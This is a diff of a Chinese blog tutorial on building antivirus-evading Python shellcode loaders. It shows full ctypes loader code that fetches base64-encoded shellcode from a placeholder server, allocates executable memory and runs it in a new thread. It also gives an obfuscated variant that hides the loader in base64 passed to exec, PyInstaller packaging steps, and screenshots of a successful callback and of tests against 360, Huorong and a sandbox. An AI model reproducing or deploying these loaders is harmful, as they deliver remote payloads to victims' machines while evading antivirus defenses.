@@ -127,7 +127,7 @@
             <section class="inner">
                 <section class="inner-main">
                     <div class="post">
-    <article id="post-ckwhbya0x0004s04z9gnu1vw0" class="article article-type-post" itemscope
+    <article id="post-ckwrjlyfr0004ys4z40jb82gr" class="article article-type-post" itemscope
     itemprop="blogPost">
 
     <div class="article-inner">
@@ -170,7 +170,7 @@
 
             
             <div class="article-busuanzi">
-                有 <span id="busuanzi_value_page_pv">N</span> 人看过
+                    有 <span id="busuanzi_value_page_pv">N</span> 人看过
             </div>
             
 
@@ -188,16 +188,66 @@
 <p> 为了防止不同版本出现的幺蛾子，在此供上我的python安装包。<br> 链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1ek3LYU8xqqjfQdqqt-dF8g">https://pan.baidu.com/s/1ek3LYU8xqqjfQdqqt-dF8g</a><br>提取码：1v27 </p>
 <h1 id="三、本地测试"><a href="#三、本地测试" class="headerlink" title="三、本地测试"></a>三、本地测试</h1><h3 id="1-生成shellcode"><a href="#1-生成shellcode" class="headerlink" title="1.生成shellcode"></a>1.生成shellcode</h3><p><img src="https://img-blog.csdnimg.cn/9607f2de003c4b428fb177e6b1f47312.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/97fccde1ff2845ad820855e8058c15ac.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/92f9e646f077425abc2277cb3bd443b4.png" alt="在这里插入图片描述"><br>保留payload.c中的双引号部分内容，并将\x换为空，得到以fc开头的一串字符。之后将其base64编码放进服务器<code>https://xxxxxxxx/1.txt</code>备用。<br><img src="https://img-blog.csdnimg.cn/f31cf550e55b4ce199225f4c87396006.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h3 id="2-代码变形"><a href="#2-代码变形" class="headerlink" title="2.代码变形"></a>2.代码变形</h3><p>加载器源码如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment">#下载shellcode</span></span><br><span class="line">scode = requests.get (<span class="string">&quot;https://xxxxxxxx/1.txt&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码转换为字节类型文件</span></span><br><span class="line">shellcode = <span class="built_in">bytearray</span> (base64.b64decode (scode.text).decode (<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># VirtualAlloc申请内存，并使用restype函数设置VirtualAlloc返回类型为ctypes.c_unit64（系统位数）</span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"></span><br><span class="line"><span class="comment"># LPVOID VirtualAlloc&#123;LPVOID lpAddress, #要分配的内存区域的地址</span></span><br><span class="line"><span class="comment">#                     DWORD dwSize,      #分配的大小</span></span><br><span class="line"><span class="comment">#                     DWORD flAllocationType, #分配的类型</span></span><br><span class="line"><span class="comment">#                     DWORD flProtect     #该内存的初始保护属性</span></span><br><span class="line"><span class="comment">#                     &#125;;</span></span><br><span class="line"></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc (ctypes.c_int (<span class="number">0</span>),</span><br><span class="line">                                           ctypes.c_int (<span class="built_in">len</span> (shellcode)),</span><br><span class="line">                                           ctypes.c_int (<span class="number">0x3000</span>),</span><br><span class="line">                                           ctypes.c_int (<span class="number">0x40</span>))</span><br><span class="line"><span class="comment"># 确定shellcode的大小</span></span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span> (shellcode)).from_buffer (shellcode)</span><br><span class="line"><span class="comment"># 从指定内存地址将内容复制到申请的内存中去</span></span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory (ctypes.c_int (ptr),</span><br><span class="line">                                      buf,</span><br><span class="line">                                      ctypes.c_int (<span class="built_in">len</span> (shellcode)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建线程</span></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread (ctypes.c_int (<span class="number">0</span>),</span><br><span class="line">                                              ctypes.c_int (<span class="number">0</span>),</span><br><span class="line">                                              ctypes.c_uint64 (ptr),</span><br><span class="line">                                              ctypes.c_int (<span class="number">0</span>),</span><br><span class="line">                                              ctypes.c_int (<span class="number">0</span>),</span><br><span class="line">                                              ctypes.pointer (ctypes.c_int (<span class="number">0</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用WaitForSingleObject函数用来检测线程的状态</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject (ctypes.c_int (handle), ctypes.c_int (-<span class="number">1</span>))</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> ctypes
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> base64
+
+<span class="hljs-comment">#下载shellcode</span>
+scode = requests.get (<span class="hljs-string">&quot;https://xxxxxxxx/1.txt&quot;</span>)
+
+<span class="hljs-comment"># 解码转换为字节类型文件</span>
+shellcode = <span class="hljs-built_in">bytearray</span> (base64.b64decode (scode.text).decode (<span class="hljs-string">&#x27;hex&#x27;</span>))
+
+<span class="hljs-comment"># VirtualAlloc申请内存，并使用restype函数设置VirtualAlloc返回类型为ctypes.c_unit64（系统位数）</span>
+ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
+
+<span class="hljs-comment"># LPVOID VirtualAlloc&#123;LPVOID lpAddress, #要分配的内存区域的地址</span>
+<span class="hljs-comment">#                     DWORD dwSize,      #分配的大小</span>
+<span class="hljs-comment">#                     DWORD flAllocationType, #分配的类型</span>
+<span class="hljs-comment">#                     DWORD flProtect     #该内存的初始保护属性</span>
+<span class="hljs-comment">#                     &#125;;</span>
+
+ptr = ctypes.windll.kernel32.VirtualAlloc (ctypes.c_int (<span class="hljs-number">0</span>),
+                                           ctypes.c_int (<span class="hljs-built_in">len</span> (shellcode)),
+                                           ctypes.c_int (<span class="hljs-number">0x3000</span>),
+                                           ctypes.c_int (<span class="hljs-number">0x40</span>))
+<span class="hljs-comment"># 确定shellcode的大小</span>
+buf = (ctypes.c_char * <span class="hljs-built_in">len</span> (shellcode)).from_buffer (shellcode)
+<span class="hljs-comment"># 从指定内存地址将内容复制到申请的内存中去</span>
+ctypes.windll.kernel32.RtlMoveMemory (ctypes.c_int (ptr),
+                                      buf,
+                                      ctypes.c_int (<span class="hljs-built_in">len</span> (shellcode)))
+
+<span class="hljs-comment"># 创建线程</span>
+handle = ctypes.windll.kernel32.CreateThread (ctypes.c_int (<span class="hljs-number">0</span>),
+                                              ctypes.c_int (<span class="hljs-number">0</span>),
+                                              ctypes.c_uint64 (ptr),
+                                              ctypes.c_int (<span class="hljs-number">0</span>),
+                                              ctypes.c_int (<span class="hljs-number">0</span>),
+                                              ctypes.pointer (ctypes.c_int (<span class="hljs-number">0</span>)))
+
+<span class="hljs-comment"># 调用WaitForSingleObject函数用来检测线程的状态</span>
+ctypes.windll.kernel32.WaitForSingleObject (ctypes.c_int (handle), ctypes.c_int (-<span class="hljs-number">1</span>))</code></pre>
 <p>变形后如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    scode = <span class="string">&#x27;&#x27;&#x27;fc4883e................&#x27;&#x27;&#x27;</span></span><br><span class="line">    shellcode = <span class="built_in">bytearray</span> (scode.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    loader = <span class="string">&#x27;&#x27;&#x27;Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MucmVzdHlwZSA9IGN0eXBlcy5jX3VpbnQ2NDtwdHIgPSBjdHlwZXMud2luZGxsLmtlcm5lbDMyLlZpcnR1YWxBbGxvYyhjdHlwZXMuY19pbnQoMCksY3R5cGVzLmNfaW50KGxlbihzaGVsbGNvZGUpKSxjdHlwZXMuY19pbnQoMHgzMDAwKSxjdHlwZXMuY19pbnQoMHg0MCkpO2J1ZiA9IChjdHlwZXMuY19jaGFyICogbGVuKHNoZWxsY29kZSkpLmZyb21fYnVmZmVyKHNoZWxsY29kZSk7Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX2ludChwdHIpLGJ1ZixjdHlwZXMuY19pbnQobGVuKHNoZWxsY29kZSkpKTtoYW5kbGUgPSBjdHlwZXMud2luZGxsLmtlcm5lbDMyLkNyZWF0ZVRocmVhZChjdHlwZXMuY19pbnQoMCksY3R5cGVzLmNfaW50KDApLGN0eXBlcy5jX3VpbnQ2NChwdHIpLGN0eXBlcy5jX2ludCgwKSxjdHlwZXMuY19pbnQoMCksY3R5cGVzLnBvaW50ZXIoY3R5cGVzLmNfaW50KDApKSk7Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5XYWl0Rm9yU2luZ2xlT2JqZWN0KGN0eXBlcy5jX2ludChoYW5kbGUpLGN0eXBlcy5jX2ludCgtMSkp&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">exec</span> (base64.b64decode(loader))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> ctypes
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> base64
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
+    scode = <span class="hljs-string">&#x27;&#x27;&#x27;fc4883e................&#x27;&#x27;&#x27;</span>
+    shellcode = <span class="hljs-built_in">bytearray</span> (scode.decode(<span class="hljs-string">&#x27;hex&#x27;</span>))
+    loader = <span class="hljs-string">&#x27;&#x27;&#x27;Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MucmVzdHlwZSA9IGN0eXBlcy5jX3VpbnQ2NDtwdHIgPSBjdHlwZXMud2luZGxsLmtlcm5lbDMyLlZpcnR1YWxBbGxvYyhjdHlwZXMuY19pbnQoMCksY3R5cGVzLmNfaW50KGxlbihzaGVsbGNvZGUpKSxjdHlwZXMuY19pbnQoMHgzMDAwKSxjdHlwZXMuY19pbnQoMHg0MCkpO2J1ZiA9IChjdHlwZXMuY19jaGFyICogbGVuKHNoZWxsY29kZSkpLmZyb21fYnVmZmVyKHNoZWxsY29kZSk7Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX2ludChwdHIpLGJ1ZixjdHlwZXMuY19pbnQobGVuKHNoZWxsY29kZSkpKTtoYW5kbGUgPSBjdHlwZXMud2luZGxsLmtlcm5lbDMyLkNyZWF0ZVRocmVhZChjdHlwZXMuY19pbnQoMCksY3R5cGVzLmNfaW50KDApLGN0eXBlcy5jX3VpbnQ2NChwdHIpLGN0eXBlcy5jX2ludCgwKSxjdHlwZXMuY19pbnQoMCksY3R5cGVzLnBvaW50ZXIoY3R5cGVzLmNfaW50KDApKSk7Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5XYWl0Rm9yU2luZ2xlT2JqZWN0KGN0eXBlcy5jX2ludChoYW5kbGUpLGN0eXBlcy5jX2ludCgtMSkp&#x27;&#x27;&#x27;</span>
+    <span class="hljs-built_in">exec</span> (base64.b64decode(loader))
+</code></pre>
 <p>由于考虑到网络原因和python编码问题（request下载按照的是unicode编码，直接decode(‘hex’)要报错，可能和版本也有关系），可能有幺蛾子，所以就把shellcode和loader放在代码里了。</p>
 <h3 id="3-pyinstaller打包"><a href="#3-pyinstaller打包" class="headerlink" title="3.pyinstaller打包"></a>3.pyinstaller打包</h3><p>需要事先装几个模块</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install requests</span><br><span class="line">python -m pip install pyinstaller==<span class="number">3.0</span></span><br><span class="line">python -m pip install pypiwin32</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python">python -m pip install requests
+python -m pip install pyinstaller==<span class="hljs-number">3.0</span>
+python -m pip install pypiwin32</code></pre>
 <p>如果网速太慢的话就用国内的镜像，后面加几个命令，例如：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python <span class="literal">-m</span> pip install pypiwin32 <span class="literal">-i</span> http://mirrors.aliyun.com/pypi/simple/  -<span class="literal">-trusted</span><span class="literal">-host</span> mirrors.aliyun.com</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs powershell">python <span class="hljs-literal">-m</span> pip install pypiwin32 <span class="hljs-literal">-i</span> http://mirrors.aliyun.com/pypi/simple/  -<span class="hljs-literal">-trusted</span><span class="hljs-literal">-host</span> mirrors.aliyun.com</code></pre>
 <p>之后打包：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller <span class="operator">-F</span> local<span class="literal">-anti</span>.py <span class="literal">-i</span> Favicon.ico <span class="literal">-w</span></span><br></pre></td></tr></table></figure>
+<pre><code class="hljs powershell">pyinstaller <span class="hljs-operator">-F</span> local<span class="hljs-literal">-anti</span>.py <span class="hljs-literal">-i</span> Favicon.ico <span class="hljs-literal">-w</span></code></pre>
 <p>关于<code>pyinstaller</code>这几个打包的参数说明如下：<br><img src="https://img-blog.csdnimg.cn/e0d2dad4432849558a38db3804091458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在dist目录下生成<code>local-anti.exe</code>，运行成功上线：<br><img src="https://img-blog.csdnimg.cn/358b6feb26b4467c939e41136a4c34fb.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h3 id="4-免杀测试"><a href="#4-免杀测试" class="headerlink" title="4.免杀测试"></a>4.免杀测试</h3><p>360：<br><img src="https://img-blog.csdnimg.cn/d76b16f1aa834e1abbb1becddaa7a44c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>火绒：<br><img src="https://img-blog.csdnimg.cn/51396ac437c346d7ae5484af847eecca.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>微步沙箱：<br><img src="https://img-blog.csdnimg.cn/d0b593f3ccd34e4faf5e7bf9c944e362.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看下来只有微软引擎报毒，看来还可以。</p>
 <h3 id="5-其他扩展"><a href="#5-其他扩展" class="headerlink" title="5.其他扩展"></a>5.其他扩展</h3><p>测试过程中发现如果在中文路径下存在无法运行的情况，经测试发现在pyinstaller == 2.0 的版本下可行。<br><img src="https://img-blog.csdnimg.cn/img_convert/85cf2c09a1bc2158593a47495fe3e487.png" alt="image-20211109153644863"><br>下载链接：<a target="_blank" rel="noopener" href="https://files.pythonhosted.org/packages/52/e5/0ce68034f3441bda11538162796dac5a8e5873e8af5d23aaea65e81c7e51/pyinstaller-2.0.zip">https://files.pythonhosted.org/packages/52/e5/0ce68034f3441bda11538162796dac5a8e5873e8af5d23aaea65e81c7e51/pyinstaller-2.0.zip</a></p>
